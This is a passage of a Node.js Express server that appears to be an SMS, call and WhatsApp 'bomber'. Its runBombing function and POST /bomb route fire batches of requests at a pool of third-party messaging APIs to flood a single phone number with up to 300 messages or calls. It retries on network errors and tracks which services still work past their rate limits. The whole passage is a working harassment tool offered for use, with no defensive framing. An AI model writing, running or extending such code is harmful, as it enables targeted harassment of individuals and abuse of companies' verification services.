            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} SERVER_ERROR (${responseTime}ms)`, 'error');
            return { success: false, category: 'fail5xx', status: st, responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';
        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { success: false, category: 'network', status: null, responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================
async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    let maxRequests = 200;
    if (effectiveDuration <= 1) maxRequests = 300;
    else if (effectiveDuration <= 5) maxRequests = 200;
    else maxRequests = 150;

    const shuffled = [...ALL_APIS];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }

    let sent = 0;
    const BATCH_SIZE = 10;

    for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    if (api.type === 'CALL') callCount++;
                    else if (api.type === 'WHATSAPP') whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================
app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'master-api',
        total_apis: ALL_APIS.length,
        sms_apis: SMS_APIS.length,
        call_apis: CALL_APIS.length,
        whatsapp_apis: WHATSAPP_APIS.length,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: ALL_APIS.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of ALL_APIS) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, type: api.type, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    const rl = results.filter(r => r.category === 'ratelimit').length;
    const rej = results.filter(r => r.category === 'rejected').length;
    logEvent(`🧪 Test complete: ${working} OK, ${rl} RL, ${rej} Rejected`, 'info');
    res.json({ phone, total: results.length, working, rate_limited: rl, rejected: rej, failed: results.length - working - rl - rej, results });
});

app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        const trulyWorking = s.success200;
        const rateLimited = s.rateLimited;
        const rejected = s.rejected;
        const failed = s.failed5xx + s.networkError;
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (trulyWorking > 0) status = 'WORKING';
            else if (rateLimited > 0) status = 'RATE_LIMITED';
            else if (rejected > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            type: s.type,
            total: s.total,
            working_2xx: s.success200,
            rate_limited_429: s.rateLimited,
            rejected_4xx: s.rejected,
            failed_5xx: s.failed5xx,
            network_error: s.networkError,
            successRate: s.total > 0 ? ((s.success200 / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-50).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = {
            name: stats[key].name, type: stats[key].type,
            total: 0, success200: 0, rateLimited: 0, rejected: 0, failed5xx: 0, networkError: 0,
            lastStatus: null, lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    logEvent(`📱 BOMB | phone=${phone} | duration=${effectiveDuration}min`, 'info');

    try {
        const result = await runBombing(phone, effectiveDuration);
        logEvent(`✅ DONE | ${phone} | OK: ${result.success} | RL: ${result.rateLimited} | Rejected: ${result.rejected} | Failed: ${result.failed} | ${result.elapsed}s`, 'success');
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            rate_limited: result.rateLimited,
            rejected: result.rejected,
            failed: result.failed,
            elapsed: result.elapsed + 's',
            total_apis: ALL_APIS.length
        });
    } catch (error) {
        logEvent(`❌ BOMB ERROR | ${phone} | ${error.message}`, 'error');
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: ALL_APIS.length,
        sms: SMS_APIS.map(a => a.name),
        call: CALL_APIS.map(a => a.name),
        whatsapp: WHATSAPP_APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 Master API Server on port ${PORT}`);
    console.log(`📊 Total APIs: ${ALL_APIS.length}`);
    console.log(`   📱 SMS: ${SMS_APIS.length}`);
    console.log(`   📞 CALL: ${CALL_APIS.length}`);
    console.log(`   💬 WHATSAPP: ${WHATSAPP_APIS.length}`);
    console.log('═══════════════════════════════════════════');
    console.log('📋 Endpoints:');
    console.log('   GET  /              - Server status');
    console.log('   GET  /health        - Health check');
    console.log('   GET  /test?phone=X  - Test all APIs');
    console.log('   GET  /stats         - Working/RL/Rejected/Failed summary');
    console.log('   GET  /logs          - Recent logs');
    console.log('   GET  /apis          - List all APIs');
    console.log('   POST /bomb          - Trigger bombing');
    console.log('═══════════════════════════════════════════');
});
